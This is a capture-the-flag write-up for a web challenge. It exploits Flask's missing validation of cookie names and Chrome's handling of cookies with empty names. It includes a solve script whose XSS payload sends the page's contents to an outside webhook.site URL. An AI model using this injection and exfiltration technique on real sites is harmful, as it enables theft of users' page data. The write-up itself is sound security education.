# Name This Cookie!

There are 2 parts to this challenge. First is adding an XSS payload to the cookie value, and second is getting past the `name.strip().startswith('flag')` check.

### 1. Setting cookie value from bot

The bot only accepts a cookie name. However, stepping into the flask source for `set_cookie`:

```python
    def set_cookie(
        self,
        key: str,
        value: str = "",
        max_age: timedelta | int | None = None,
        expires: str | datetime | int | float | None = None,
        path: str | None = "/",
        domain: str | None = None,
        secure: bool = False,
        httponly: bool = False,
        samesite: str | None = None,
        partitioned: bool = False,
    ) -> None:
        [...]
        self.headers.add(
            "Set-Cookie",
            dump_cookie(
                key,
                value=value,
                max_age=max_age,
                expires=expires,
                path=path,
                domain=domain,
                secure=secure,
                httponly=httponly,
                max_size=self.max_cookie_size,
                samesite=samesite,
                partitioned=partitioned,
            ),
        )
```

```python
def dump_cookie(
    key: str,
    value: str = "",
    max_age: timedelta | int | None = None,
    expires: str | datetime | int | float | None = None,
    path: str | None = "/",
    domain: str | None = None,
    secure: bool = False,
    httponly: bool = False,
    sync_expires: bool = True,
    max_size: int = 4093,
    samesite: str | None = None,
    partitioned: bool = False,
) -> str:
    [...]
    buf = [f"{key.encode().decode('latin1')}={value}"]
    [...]  # a string is constructed from `buf` and returned
```

Looking at `dump_cookie`, we can see that there is no input validation for `key`, so it could contain `=`.

Thus, by passing `cookie_name=my_cookie_name=my_cookie_value` to the bot, we are able to set a cookie `my_cookie_name` with the value `my_cookie_value<flag>`. (It is also possible to omit the `<flag>` part from the value by appending `;`, although this isn't relevant to the solution.)

### 2. Bypassing the filter

This is where it gets interesting. The solution is quite unintuitive, and you have to do some experimentation to stumble upon it.

We start by attempting to set a cookie with an empty name. You can do this in the chrome devtools console:

```javascript
> document.cookie = '=myvalue'
> document.cookie
'myvalue'
```

This is an interesting quirk. Chrome considers an empty string as a valid cookie key, however when `document.cookie` is read, the `=` is omitted. Similarly, when the cookie is included in a request, only the value is passed: `Cookie: myvalue`.

Thus, by setting the cookie name as `=flag=<script>alert(1)</script>`, we obtain XSS.

Since the actual flag is appended to the end, we can just read `document.body.innerHTML` to retrieve it. Final solve script:

```python
import requests

url = 'http://localhost:5000'

sess = requests.Session()

resp = sess.post(url + '/visit?cookie_name==flag=<script>setTimeout(()=>location.href=`https://webhook.site/0378944e-2533-4d86-bf15-d37956810116?t=${document.body.innerHTML}`,1)</script>')
print(resp.text)
```

Turns out the right name for the cookie ... is no name at all.

Flag: `blahaj{n4m3l3ss_c0ok1e}`
